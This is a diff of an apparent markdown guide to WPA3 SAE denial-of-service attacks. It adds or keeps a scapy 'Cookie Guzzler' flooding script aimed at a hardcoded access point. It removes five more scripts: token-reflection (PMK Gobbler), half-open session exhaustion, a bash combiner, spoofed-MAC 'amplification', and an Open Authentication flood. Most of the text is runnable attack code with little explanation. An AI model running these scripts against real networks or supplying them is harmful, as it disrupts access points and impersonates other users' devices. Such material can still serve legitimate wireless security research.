@@ -78,14 +78,11 @@ network={
 sudo systemctl stop NetworkManager
 sudo wpa_supplicant -c test_sae.conf -i wlo1 - d
 
+## 2. **Cookie Guzzler Attack
 
-### 2. Cookie Guzzler Attack
+🎯 Goal: Overwhelm AP's CPU by triggering anti-clogging mechanism
 
-## 🎯 Goal: Overwhelm AP's CPU by triggering anti-clogging mechanism
-
-## 🐍 Python Code (cookie_guzzler.py):
-python
-
+🐍 Python Code (cookie_guzzler.py):**
 from scapy.all import *
 import random
 
@@ -107,139 +104,3 @@ while True:
             Dot11Auth(algo=3, seqnum=1, status=0) / \
             group / scalar / finite
     sendp(frame, iface="wlo1", verbose=0)
-
-3. PMK Gobbler Attack
-
-🎯 Goal: Exhaust AP resources by forcing PMK generation
-
-🐍 Python Code (pmk_gobbler.py):
-python
-
-from scapy.all import *
-import subprocess
-import time
-
-bssid = "EC:75:0C:ED:83:E2"
-group = b"\x13\x00"
-scalar = b"..."; finite = b"..."
-
-def capture_cookies(duration=10):
-    cmd = f"sudo tshark -i wlan0mon -Y 'wlan.fixed.anti_clogging_token' -T fields -e wlan.fixed.anti_clogging_token -e wlan.sa -a duration:{duration}"
-    result = subprocess.check_output(cmd, shell=True).decode()
-    return result.splitlines()
-
-def reflect_cookie(token, mac):
-    frame = RadioTap() / \
-            Dot11(addr1=bssid, addr2=mac, addr3=bssid) / \
-            Dot11Auth(algo=3, seqnum=1, status=0) / \
-            group / bytes.fromhex(token) / scalar / finite
-    sendp(frame, iface="wlo1", verbose=0)
-
-captured_data = capture_cookies(60)
-for line in captured_data:
-    if line:
-        parts = line.split()
-        if len(parts) >= 2:
-            token, mac = parts[0], parts[1]
-            reflect_cookie(token, mac)
-            time.sleep(0.1)
-
-4. Memory Omnivore Attack
-
-🎯 Goal: Consume AP's memory with half-open sessions
-
-🐍 Python Code (memory_omnivore.py):
-python
-
-from scapy.all import *
-import itertools
-import time
-
-bssid = "EC:75:0C:ED:83:E2"
-group = b"\x13\x00"
-scalar = b"..."; finite = b"..."
-
-mac_pool = ["7C:D2:DA:BB:37:B8", "D6:E2:F7:98:36:8E", 
-           "90:4C:C5:D9:58:4A", "AA:BB:CC:DD:EE:FF"]
-
-for mac in itertools.cycle(mac_pool):
-    frame = RadioTap() / \
-            Dot11(addr1=bssid, addr2=mac, addr3=bssid) / \
-            Dot11Auth(algo=3, seqnum=1, status=0) / \
-            group / scalar / finite
-    sendp(frame, iface="wlo1", verbose=0)
-    time.sleep(0.1)
-
-5. Double-Decker Attack
-
-🎯 Goal: Combine attacks for maximum impact
-
-📜 Bash Script (double_decker.sh):
-bash
-
-#!/bin/bash
-python3 memory_omnivore.py &
-PID_MEM=$!
-
-python3 cookie_guzzler.py &
-PID_COOKIE=$!
-
-sleep 180
-
-kill $PID_MEM $PID_COOKIE
-
-6. Amplification Attack
-
-🎯 Goal: Amplify DoS using other network devices
-
-🐍 Python Code (amplification.py):
-python
-
-from scapy.all import *
-import time
-
-bssid = "EC:75:0C:ED:83:E2"
-group = b"\x13\x00"
-scalar = b"..."; finite = b"..."
-
-spoofed_macs = ["C4:AB:CD:EF:12:34", "D8:AC:DE:F1:23:45", "11:22:33:44:55:66"]
-
-for victim_mac in spoofed_macs:
-    frame = RadioTap() / \
-            Dot11(addr1=bssid, addr2=victim_mac, addr3=bssid) / \
-            Dot11Auth(algo=3, seqnum=1, status=0) / \
-            group / scalar / finite
-    sendp(frame, iface="wlo1", verbose=0)
-    time.sleep(0.05)
-
-7. Open Authentication Attack
-
-🎯 Goal: Flood with legacy Open Authentication requests
-
-🐍 Python Code (open_auth.py):
-python
-
-from scapy.all import *
-import random
-
-def rand_mac():
-    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
-        random.randint(0, 255), random.randint(0, 255),
-        random.randint(0, 255), random.randint(0, 255),
-        random.randint(0, 255), random.randint(0, 255))
-
-bssid = "EC:75:0C:ED:83:E2"
-
-while True:
-    client_mac = rand_mac()
-    frame = RadioTap() / \
-            Dot11(addr1=bssid, addr2=client_mac, addr3=bssid) / \
-            Dot11Auth(algo=0, seqnum=1, status=0)
-    sendp(frame, iface="wlo1", verbose=0, count=10)
-    time.sleep(0.01)
-
-
-
-
-
-
